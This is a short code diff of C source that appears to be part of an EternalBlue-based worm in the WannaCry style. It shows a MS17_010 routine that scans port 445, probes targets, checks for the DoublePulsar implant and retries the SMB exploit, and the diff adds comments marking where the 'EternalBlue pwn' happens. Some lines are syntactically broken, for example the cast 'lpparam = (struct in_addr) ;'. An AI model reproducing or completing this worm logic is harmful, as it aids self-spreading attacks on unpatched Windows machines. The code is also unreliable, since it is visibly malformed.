@@ -178,6 +178,7 @@ DWORD MS17_010(DWORD LPPARAM)
 {
 	lpparam = (struct in_addr) ;
 	int attemptCount;
+	//CheckMS17Vulnerability here; continue if vulnerable
 	if ( tryFirstSetBuffers(&target, 445))
 	{
 		attemptCount = 0;
@@ -187,6 +188,7 @@ DWORD MS17_010(DWORD LPPARAM)
 			if ( IsDOUBLEPULSARInstalled(&target, 1, 445) )
 			      break;
 		      	Sleep(3000);
+			//EternalBlue pwn here
 		      	trySecondSetBuffers(&target, 445);
 		      	++attemptCount;
 		 } while ( attemptCount < 5 );
@@ -199,7 +201,7 @@ DWORD MS17_010(DWORD LPPARAM)
 	endthreadex(0);
 	return 0;
 }
-
+			      
 int scanIP(DWORD LPPARAM)
 {
 	if (canConnectToPort445(target) > 0)
